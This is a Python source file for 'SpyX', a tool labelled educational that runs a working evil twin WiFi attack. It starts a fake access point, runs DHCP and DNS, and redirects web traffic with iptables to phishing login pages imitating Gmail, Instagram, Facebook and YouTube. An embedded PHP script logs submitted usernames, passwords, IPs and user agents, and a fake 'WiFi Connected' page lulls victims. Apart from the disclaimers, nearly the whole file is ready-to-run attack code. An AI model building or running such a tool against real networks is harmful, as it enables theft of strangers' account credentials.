#!/usr/bin/env python3
"""
SpyX - Educational Wireless Security Testing Tool
FOR AUTHORIZED LAB USE ONLY

This tool demonstrates:
- Evil Twin Access Point creation
- Phishing page deployment
- Credential capture techniques
- Wireless security concepts

Use only on devices and networks you own or have explicit permission to test.
"""

import os
import sys
import time
import signal
import subprocess
import threading
import socket
import json
import hashlib
import re
from pathlib import Path
from datetime import datetime

try:
    import netifaces
except ImportError:
    print("[!] netifaces not installed. Installing...")
    subprocess.call([sys.executable, "-m", "pip", "install", "netifaces"])
    import netifaces

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    # Fallback if colorama not installed
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        MAGENTA = '\033[95m'
    
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        RESET_ALL = '\033[0m'
    
    init = lambda: None

# Configuration
class Config:
    # Network Configuration
    INTERFACE = None
    WEB_PORT = 80
    WEB_HOST = '0.0.0.0'
    
    # DHCP Configuration
    DHCP_START = '192.168.1.10'
    DHCP_END = '192.168.1.50'
    DHCP_GATEWAY = '192.168.1.1'
    DHCP_NETMASK = '255.255.255.0'
    
    # WiFi Configuration
    SSID = None
    CHANNEL = 6
    
    # Paths
    TEMPLATE_DIR = Path(__file__).parent / 'templates'
    LOG_DIR = Path(__file__).parent / 'logs'
    WEB_ROOT = Path('/tmp/spyx_web')
    
    # Colors
    class Colors:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        CYAN = Fore.CYAN
        MAGENTA = Fore.MAGENTA
        WHITE = Fore.WHITE
        BOLD = Style.BRIGHT
        END = Style.RESET_ALL
    
    # Banner
    BANNER = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
║                    {Colors.WHITE}SPYX Educational Tool{Colors.RED}                            ║
║              {Colors.YELLOW}Wireless Security Testing Framework{Colors.RED}                     ║
║          {Colors.CYAN}FOR AUTHORIZED LAB USE ONLY{Colors.RED}                                ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    
    # Warning message
    WARNING = f"""
{Colors.YELLOW}{Colors.BOLD}{'='*60}
[!] LEGAL NOTICE [!]
{'='*60}{Colors.END}
{Colors.WHITE}
This tool is for EDUCATIONAL PURPOSES only.
Use ONLY on devices and networks you OWN or have EXPLICIT PERMISSION to test.

By using this tool, you acknowledge that:
1. You are using it in an authorized lab environment
2. You have permission to test all target devices
3. You will not use this against any unauthorized targets
4. You understand the legal implications of unauthorized access

Unauthorized use is illegal and may result in:
- Criminal prosecution under CFAA and similar laws
- Civil liability
- Permanent damage to your professional reputation

{Colors.YELLOW}Type 'I UNDERSTAND' to continue: {Colors.END}"""


class SpyX:
    def __init__(self):
        self.running = True
        self.processes = []
        self.current_interface = None
        self.temp_files = []
        self.captured_credentials = []
        
        # Register signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Create necessary directories
        Config.LOG_DIR.mkdir(exist_ok=True)
        Config.TEMPLATE_DIR.mkdir(exist_ok=True)
        
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n\n{Config.Colors.YELLOW}[!] Stopping SpyX...{Config.Colors.END}")
        self.running = False
        self.cleanup()
        print(f"{Config.Colors.GREEN}[✓] Cleanup complete. All systems restored.{Config.Colors.END}")
        print(f"{Config.Colors.CYAN}[✓] Captured credentials saved in: {Config.LOG_DIR}{Config.Colors.END}")
        sys.exit(0)
    
    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print(f"{Config.Colors.RED}[!] This tool must be run as root!{Config.Colors.END}")
            print(f"{Config.Colors.YELLOW}Try: sudo python3 spyx.py{Config.Colors.END}")
            sys.exit(1)
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        print(f"{Config.Colors.BLUE}[*] Checking dependencies...{Config.Colors.END}")
        
        required_tools = ['hostapd', 'dnsmasq', 'php', 'iptables']
        missing_tools = []
        
        for tool in required_tools:
            if subprocess.call(f'which {tool}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"{Config.Colors.RED}[!] Missing dependencies: {', '.join(missing_tools)}{Config.Colors.END}")
            print(f"{Config.Colors.YELLOW}[*] Install with: sudo apt-get install {' '.join(missing_tools)}{Config.Colors.END}")
            sys.exit(1)
        
        print(f"{Config.Colors.GREEN}[✓] All dependencies satisfied{Config.Colors.END}")
    
    def show_warning(self):
        """Display legal warning and get confirmation"""
        print(Config.WARNING, end="")
        confirmation = input().strip().upper()
        if confirmation != "I UNDERSTAND":
            print(f"{Config.Colors.RED}[!] Exiting. You must acknowledge the legal notice.{Config.Colors.END}")
            sys.exit(0)
    
    def detect_interface(self):
        """Auto-detect wireless interface"""
        print(f"{Config.Colors.BLUE}[*] Detecting wireless interfaces...{Config.Colors.END}")
        
        try:
            interfaces = netifaces.interfaces()
        except:
            # Fallback to iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
        
        wireless_ifs = []
        
        for iface in interfaces:
            if iface.startswith('wl') or iface.startswith('wlan') or iface.startswith('eth'):
                # Check if it's wireless
                result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
                if 'IEEE 802.11' in result.stdout or 'ESSID' in result.stdout:
                    wireless_ifs.append(iface)
        
        if not wireless_ifs:
            print(f"{Config.Colors.RED}[!] No wireless interfaces found!{Config.Colors.END}")
            print(f"{Config.Colors.YELLOW}[*] Make sure your wireless adapter is connected{Config.Colors.END}")
            sys.exit(1)
        
        print(f"{Config.Colors.GREEN}[✓] Found wireless interfaces: {', '.join(wireless_ifs)}{Config.Colors.END}")
        
        if len(wireless_ifs) == 1:
            self.current_interface = wireless_ifs[0]
        else:
            print(f"{Config.Colors.YELLOW}[?] Select interface (0-{len(wireless_ifs)-1}):{Config.Colors.END}")
            for i, iface in enumerate(wireless_ifs):
                print(f"  {i}: {iface}")
            try:
                choice = int(input().strip())
                self.current_interface = wireless_ifs[choice]
            except:
                self.current_interface = wireless_ifs[0]
        
        print(f"{Config.Colors.GREEN}[✓] Using interface: {self.current_interface}{Config.Colors.END}")
        return self.current_interface
    
    def stop_conflicting_services(self):
        """Stop services that might interfere"""
        print(f"{Config.Colors.BLUE}[*] Stopping conflicting services...{Config.Colors.END}")
        
        # Stop network managers that might interfere
        services = ['NetworkManager', 'wpa_supplicant', 'avahi-daemon']
        for service in services:
            subprocess.call(f'systemctl stop {service} 2>/dev/null', shell=True)
            subprocess.call(f'killall {service} 2>/dev/null', shell=True)
        
        # Kill any existing instances
        subprocess.call('killall hostapd dnsmasq php 2>/dev/null', shell=True)
        
        time.sleep(1)
        print(f"{Config.Colors.GREEN}[✓] Conflicting services stopped{Config.Colors.END}")
    
    def get_wifi_name(self):
        """Get target WiFi name from user"""
        print(f"{Config.Colors.BLUE}[?] Enter the WiFi network name (SSID) to create: {Config.Colors.END}", end="")
        ssid = input().strip()
        if not ssid:
            ssid = "Free_Public_WiFi"
        
        # Store SSID in config
        Config.SSID = ssid
        
        print(f"{Config.Colors.GREEN}[✓] Creating network: {ssid}{Config.Colors.END}")
        return ssid
    
    def show_menu(self):
        """Display attack menu"""
        print(f"{Config.Colors.CYAN}\n{'='*50}{Config.Colors.END}")
        print(f"{Config.Colors.BOLD}Select login page to serve:{Config.Colors.END}")
        print(f"{Config.Colors.GREEN}1.{Config.Colors.END} Gmail")
        print(f"{Config.Colors.GREEN}2.{Config.Colors.END} Instagram")
        print(f"{Config.Colors.GREEN}3.{Config.Colors.END} Facebook")
        print(f"{Config.Colors.GREEN}4.{Config.Colors.END} YouTube")
        print(f"{Config.Colors.CYAN}{'='*50}{Config.Colors.END}")
        
        choice = input(f"{Config.Colors.YELLOW}[?] Enter choice (1-4): {Config.Colors.END}").strip()
        
        templates = {
            '1': 'gmail.html',
            '2': 'instagram.html',
            '3': 'facebook.html',
            '4': 'youtube.html'
        }
        
        if choice not in templates:
            print(f"{Config.Colors.RED}[!] Invalid choice. Using Gmail.{Config.Colors.END}")
            choice = '1'
        
        template_name = templates[choice]
        template_map = {
            'gmail.html': 'Gmail',
            'instagram.html': 'Instagram', 
            'facebook.html': 'Facebook',
            'youtube.html': 'YouTube'
        }
        
        print(f"{Config.Colors.GREEN}[✓] Selected: {template_map[template_name]}{Config.Colors.END}")
        return template_name
    
    def start_ap(self, ssid, channel=6):
        """Start fake access point"""
        print(f"{Config.Colors.BLUE}[*] Starting fake access point...{Config.Colors.END}")
        
        # Bring interface up
        subprocess.call(f'ifconfig {self.current_interface} up', shell=True)
        
        # Set interface to master mode
        subprocess.call(f'iwconfig {self.current_interface} mode master 2>/dev/null', shell=True)
        
        # Create hostapd config
        hostapd_conf = f"""interface={self.current_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        hostapd_conf_path = "/tmp/spyx_hostapd.conf"
        with open(hostapd_conf_path, 'w') as f:
            f.write(hostapd_conf)
        self.temp_files.append(hostapd_conf_path)
        
        # Start hostapd
        try:
            hostapd_process = subprocess.Popen(
                ['hostapd', hostapd_conf_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(hostapd_process)
        except Exception as e:
            print(f"{Config.Colors.RED}[!] Failed to start hostapd: {e}{Config.Colors.END}")
            return False
        
        # Wait for AP to start
        time.sleep(3)
        print(f"{Config.Colors.GREEN}[✓] Fake AP '{ssid}' started on channel {channel}{Config.Colors.END}")
        return True
    
    def start_dhcp(self):
        """Start DHCP server"""
        print(f"{Config.Colors.BLUE}[*] Starting DHCP server...{Config.Colors.END}")
        
        # Configure interface IP
        subprocess.call(f'ifconfig {self.current_interface} up {Config.DHCP_GATEWAY} netmask {Config.DHCP_NETMASK}', shell=True)
        
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        
        # Create dnsmasq config
        dnsmasq_conf = f"""interface={self.current_interface}
dhcp-range={Config.DHCP_START},{Config.DHCP_END},{Config.DHCP_NETMASK},12h
dhcp-option=3,{Config.DHCP_GATEWAY}
dhcp-option=6,{Config.DHCP_GATEWAY}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
dhcp-leasefile=/tmp/spyx_leases
"""
        
        dnsmasq_conf_path = "/tmp/spyx_dnsmasq.conf"
        with open(dnsmasq_conf_path, 'w') as f:
            f.write(dnsmasq_conf)
        self.temp_files.append(dnsmasq_conf_path)
        
        # Start dnsmasq
        try:
            dnsmasq_process = subprocess.Popen(
                ['dnsmasq', '-C', dnsmasq_conf_path, '-d'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(dnsmasq_process)
        except Exception as e:
            print(f"{Config.Colors.RED}[!] Failed to start dnsmasq: {e}{Config.Colors.END}")
            return False
        
        time.sleep(2)
        print(f"{Config.Colors.GREEN}[✓] DHCP server started{Config.Colors.END}")
        return True
    
    def create_capture_script(self):
        """Create the credential capture PHP script"""
        return """<?php
// SpyX Educational Credential Capture Script
// FOR LAB USE ONLY

$logFile = __DIR__ . '/logs/credentials.log';
$timestamp = date('Y-m-d H:i:s');
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$platform = $_POST['platform'] ?? 'Unknown';
$ssid = $_POST['ssid'] ?? 'Free_Public_WiFi';

// Capture credentials
$credentials = [];
foreach ($_POST as $key => $value) {
    if ($key != 'platform' && $key != 'ssid') {
        $credentials[$key] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }
}

// Format log entry
$logEntry = sprintf(
    "[%s] Platform: %s | SSID: %s | IP: %s | UA: %s\\n",
    $timestamp,
    $platform,
    $ssid,
    $clientIP,
    $userAgent
);

foreach ($credentials as $field => $value) {
    $logEntry .= sprintf("  %s: %s\\n", $field, $value);
}
$logEntry .= str_repeat("-", 80) . "\\n";

// Write to log file
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Also save to a separate file for easy viewing
$simpleLog = __DIR__ . '/logs/creds_simple.txt';
$simpleEntry = sprintf("[%s] %s | %s | %s\\n", $timestamp, $platform, $ssid, json_encode($credentials));
file_put_contents($simpleLog, $simpleEntry, FILE_APPEND);

// Redirect to success page
header('Location: /success.html?ssid=' . urlencode($ssid));
exit();
?>
"""
    
    def start_web_server(self, template_file):
        """Start web server with phishing page and success page"""
        print(f"{Config.Colors.BLUE}[*] Starting web server...{Config.Colors.END}")
        
        # Create web root directory
        Config.WEB_ROOT.mkdir(exist_ok=True)
        
        # Copy template to web root
        template_path = Config.TEMPLATE_DIR / template_file
        if not template_path.exists():
            print(f"{Config.Colors.RED}[!] Template not found: {template_path}{Config.Colors.END}")
            return False
        
        # Read and modify template
        with open(template_path, 'r') as src:
            html_content = src.read()
        
        # Add hidden SSID field if not present
        if '<input type="hidden" name="ssid"' not in html_content:
            ssid_input = f'<input type="hidden" name="ssid" value="{Config.SSID}">'
            html_content = html_content.replace('</form>', f'{ssid_input}</form>')
        
        # Ensure form action points to capture endpoint
        html_content = html_content.replace('action="/capture"', 'action="/capture"')
        
        # Save index.html
        index_path = Config.WEB_ROOT / 'index.html'
        with open(index_path, 'w') as dst:
            dst.write(html_content)
        
        # Create capture.php
        capture_script = self.create_capture_script()
        capture_path = Config.WEB_ROOT / 'capture.php'
        with open(capture_path, 'w') as f:
            f.write(capture_script)
        
        # Copy success.html template
        success_template = Config.TEMPLATE_DIR / 'success.html'
        if success_template.exists():
            with open(success_template, 'r') as src:
                success_content = src.read()
            success_path = Config.WEB_ROOT / 'success.html'
            with open(success_path, 'w') as dst:
                dst.write(success_content)
            print(f"{Config.Colors.GREEN}[✓] Success page loaded{Config.Colors.END}")
        else:
            print(f"{Config.Colors.YELLOW}[!] Warning: success.html not found, creating basic version{Config.Colors.END}")
            basic_success = self.create_basic_success_page()
            success_path = Config.WEB_ROOT / 'success.html'
            with open(success_path, 'w') as f:
                f.write(basic_success)
        
        # Create logs directory in web root
        web_logs = Config.WEB_ROOT / 'logs'
        web_logs.mkdir(exist_ok=True)
        
        # Create .htaccess to prevent directory listing
        htaccess_path = Config.WEB_ROOT / '.htaccess'
        with open(htaccess_path, 'w') as f:
            f.write("Options -Indexes\n")
        
        # Start PHP server
        try:
            os.chdir(Config.WEB_ROOT)
            php_process = subprocess.Popen(
                ['php', '-S', f'{Config.WEB_HOST}:{Config.WEB_PORT}'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(php_process)
        except Exception as e:
            print(f"{Config.Colors.RED}[!] Failed to start PHP server: {e}{Config.Colors.END}")
            return False
        
        time.sleep(2)
        print(f"{Config.Colors.GREEN}[✓] Web server started on port {Config.WEB_PORT}{Config.Colors.END}")
        print(f"{Config.Colors.GREEN}[✓] Login page: {template_file}{Config.Colors.END}")
        print(f"{Config.Colors.GREEN}[✓] Success page: success.html{Config.Colors.END}")
        return True
    
    def create_basic_success_page(self):
        """Create a basic success page if template doesn't exist"""
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Connected - Enjoy!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 50px 40px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            transform: scale(0.9);
            animation: scaleIn 0.5s ease-out forwards;
        }
        
        @keyframes scaleIn {
            from {
                transform: scale(0.9);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .checkmark {
            width: 80px;
            height: 80px;
            background: #4caf50;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: bounce 0.6s ease-out;
        }
        
        @keyframes bounce {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .checkmark:after {
            content: '✓';
            color: white;
            font-size: 50px;
            font-weight: bold;
        }
        
        .wifi-icon {
            font-size: 48px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        p {
            color: #666;
            font-size: 18px;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        .network-name {
            background: #f5f5f5;
            border-radius: 10px;
            padding: 10px;
            margin: 20px 0;
            font-family: monospace;
            color: #667eea;
            font-weight: bold;
        }
        
        .redirect {
            color: #999;
            font-size: 12px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
        }
        
        .button {
            display: inline-block;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 30px;
            border-radius: 25px;
            text-decoration: none;
            margin-top: 20px;
            transition: transform 0.3s;
            font-weight: 500;
            border: none;
            cursor: pointer;
        }
        
        .button:hover {
            transform: translateY(-2px);
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            p {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark"></div>
        <div class="wifi-icon">📶</div>
        <h1>WiFi Connected!</h1>
        <p>Congratulations! You are now connected to the internet.<br><strong>Enjoy your free WiFi!</strong> 🎉</p>
        <div class="network-name" id="networkName">Loading...</div>
        <a href="#" class="button" id="continueBtn">Continue to Internet <span id="loadingIcon" class="loading" style="display: none;"></span></a>
        <div class="redirect">Redirecting to Google in <span id="countdown">5</span> seconds...</div>
    </div>
    
    <script>
        // Get network name from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const ssid = urlParams.get('ssid') || 'Free_Public_WiFi';
        document.getElementById('networkName').innerHTML = '📡 Connected to: <strong>' + ssid + '</strong>';
        
        // Countdown and redirect
        let seconds = 5;
        const countdownElement = document.getElementById('countdown');
        const continueBtn = document.getElementById('continueBtn');
        const loadingIcon = document.getElementById('loadingIcon');
        
        const timer = setInterval(() => {
            seconds--;
            countdownElement.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(timer);
                loadingIcon.style.display = 'inline-block';
                continueBtn.style.pointerEvents = 'none';
                window.location.href = 'https://www.google.com';
            }
        }, 1000);
        
        continueBtn.addEventListener('click', function(e) {
            e.preventDefault();
            clearInterval(timer);
            loadingIcon.style.display = 'inline-block';
            continueBtn.style.pointerEvents = 'none';
            window.location.href = 'https://www.google.com';
        });
    </script>
</body>
</html>"""
    
    def setup_iptables(self):
        """Setup iptables rules for DNS spoofing and redirection"""
        print(f"{Config.Colors.BLUE}[*] Setting up iptables rules...{Config.Colors.END}")
        
        # Save current iptables rules (optional)
        subprocess.call('iptables-save > /tmp/iptables_backup.rules 2>/dev/null', shell=True)
        self.temp_files.append('/tmp/iptables_backup.rules')
        
        # Flush existing rules
        subprocess.call('iptables -t nat -F', shell=True)
        subprocess.call('iptables -F', shell=True)
        
        # Set up NAT
        subprocess.call(f'iptables -t nat -A POSTROUTING -o {self.current_interface} -j MASQUERADE', shell=True)
        
        # Redirect HTTP and HTTPS to local web server
        subprocess.call(f'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {Config.DHCP_GATEWAY}:80', shell=True)
        subprocess.call(f'iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination {Config.DHCP_GATEWAY}:80', shell=True)
        
        # Allow forwarding
        subprocess.call('iptables -A FORWARD -j ACCEPT', shell=True)
        subprocess.call(f'iptables -A FORWARD -i {self.current_interface} -j ACCEPT', shell=True)
        
        print(f"{Config.Colors.GREEN}[✓] Iptables rules configured{Config.Colors.END}")
    
    def monitor_logs(self):
        """Monitor captured credentials in real-time"""
        log_file = Config.WEB_ROOT / 'logs' / 'credentials.log'
        
        # Wait for log file to be created
        timeout = 30
        while not log_file.exists() and timeout > 0 and self.running:
            time.sleep(1)
            timeout -= 1
        
        if not log_file.exists():
            return
        
        print(f"\n{Config.Colors.CYAN}{'='*60}{Config.Colors.END}")
        print(f"{Config.Colors.BOLD}[*] Monitoring for captured credentials...{Config.Colors.END}")
        print(f"{Config.Colors.YELLOW}[*] Connect to the WiFi network and visit any website{Config.Colors.END}")
        print(f"{Config.Colors.YELLOW}[*] Press Ctrl+C to stop{Config.Colors.END}")
        print(f"{Config.Colors.CYAN}{'='*60}{Config.Colors.END}\n")
        
        last_size = 0
        
        while self.running:
            try:
                if log_file.exists():
                    current_size = log_file.stat().st_size
                    if current_size > last_size:
                        with open(log_file, 'r') as f:
                            f.seek(last_size)
                            new_content = f.read()
                            if new_content:
                                # Parse and display new credentials
                                lines = new_content.split('\n')
                                for line in lines:
                                    if line.strip():
                                        if 'Platform:' in line:
                                            print(f"\n{Config.Colors.GREEN}[+] {line.strip()}{Config.Colors.END}")
                                        elif 'email:' in line or 'username:' in line:
                                            print(f"{Config.Colors.CYAN}    📧 {line.strip()}{Config.Colors.END}")
                                        elif 'password:' in line:
                                            print(f"{Config.Colors.MAGENTA}    🔑 {line.strip()}{Config.Colors.END}")
                                        elif '-'*40 in line:
                                            pass
                                        else:
                                            print(f"{Config.Colors.WHITE}    {line.strip()}{Config.Colors.END}")
                        last_size = current_size
            except Exception:
                pass
            time.sleep(0.5)
    
    def cleanup(self):
        """Clean up and restore system"""
        print(f"{Config.Colors.BLUE}[*] Cleaning up...{Config.Colors.END}")
        
        # Kill all processes
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        # Restore iptables
        subprocess.call('iptables -t nat -F', shell=True)
        subprocess.call('iptables -F', shell=True)
        
        # Restore from backup if exists
        if Path('/tmp/iptables_backup.rules').exists():
            subprocess.call('iptables-restore < /tmp/iptables_backup.rules 2>/dev/null', shell=True)
        
        # Bring interface down and restore managed mode
        try:
            subprocess.call(f'ifconfig {self.current_interface} down', shell=True)
            subprocess.call(f'iwconfig {self.current_interface} mode managed 2>/dev/null', shell=True)
            subprocess.call(f'ifconfig {self.current_interface} up', shell=True)
        except:
            pass
        
        # Kill any remaining processes
        subprocess.call('killall hostapd dnsmasq php 2>/dev/null', shell=True)
        
        # Clean up temp files
        for temp_file in self.temp_files:
            try:
                Path(temp_file).unlink()
            except:
                pass
        
        # Copy captured credentials to logs directory
        captured_log = Config.WEB_ROOT / 'logs' / 'credentials.log'
        if captured_log.exists():
            import shutil
            dest = Config.LOG_DIR / f'credentials_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
            shutil.copy2(captured_log, dest)
            print(f"{Config.Colors.GREEN}[✓] Credentials saved to: {dest}{Config.Colors.END}")
        
        # Remove web root
        try:
            import shutil
            shutil.rmtree(Config.WEB_ROOT, ignore_errors=True)
        except:
            pass
        
        # Restart network manager
        subprocess.call('systemctl restart NetworkManager 2>/dev/null', shell=True)
        
        print(f"{Config.Colors.GREEN}[✓] Cleanup complete{Config.Colors.END}")
    
    def run(self):
        """Main execution flow"""
        # Clear screen
        os.system('clear')
        
        # Display banner
        print(Config.BANNER)
        
        # Initial checks
        self.check_root()
        self.check_dependencies()
        self.show_warning()
        
        # Setup
        self.detect_interface()
        self.stop_conflicting_services()
        
        # Get user input
        ssid = self.get_wifi_name()
        template = self.show_menu()
        
        print(f"\n{Config.Colors.BLUE}[*] Starting SpyX...{Config.Colors.END}")
        
        try:
            # Start services
            if not self.start_ap(ssid, Config.CHANNEL):
                raise Exception("Failed to start access point")
            
            if not self.start_dhcp():
                raise Exception("Failed to start DHCP server")
            
            if not self.start_web_server(template):
                raise Exception("Failed to start web server")
            
            self.setup_iptables()
            
            # Display running message
            print(f"\n{Config.Colors.GREEN}{'='*60}{Config.Colors.END}")
            print(f"{Config.Colors.GREEN}[✓] SpyX is running!{Config.Colors.END}")
            print(f"{Config.Colors.CYAN}WiFi Network: {ssid}{Config.Colors.END}")
            print(f"{Config.Colors.CYAN}Login page: http://{Config.DHCP_GATEWAY}{Config.Colors.END}")
            print(f"{Config.Colors.YELLOW}Press Ctrl+C to stop{Config.Colors.END}")
            print(f"{Config.Colors.GREEN}{'='*60}{Config.Colors.END}\n")
            
            # Start monitoring in a separate thread
            monitor_thread = threading.Thread(target=self.monitor_logs, daemon=True)
            monitor_thread.start()
            
            # Keep the main thread alive
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.signal_handler(None, None)
        except Exception as e:
            print(f"{Config.Colors.RED}[!] Error: {e}{Config.Colors.END}")
            self.cleanup()
            sys.exit(1)


if __name__ == "__main__":
    tool = SpyX()
    tool.run()